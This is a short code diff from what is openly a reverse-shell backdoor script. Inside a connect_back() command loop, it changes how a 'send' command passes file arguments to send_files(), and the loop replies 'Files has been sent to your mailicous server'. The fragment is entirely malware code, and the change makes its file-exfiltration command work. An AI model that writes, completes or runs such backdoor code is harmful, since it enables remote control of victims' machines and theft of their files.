@@ -51,7 +51,8 @@ def connect_back():
             if not cmd:
                 continue
             if cmd.startswith("send"):
-                send_files(cmd)
+                args_files = cmd.split()
+                send_files(args_files)
                 s.send("Files has been sent to your mailicous server")
                 continue
             if cmd.lower() == "exit":
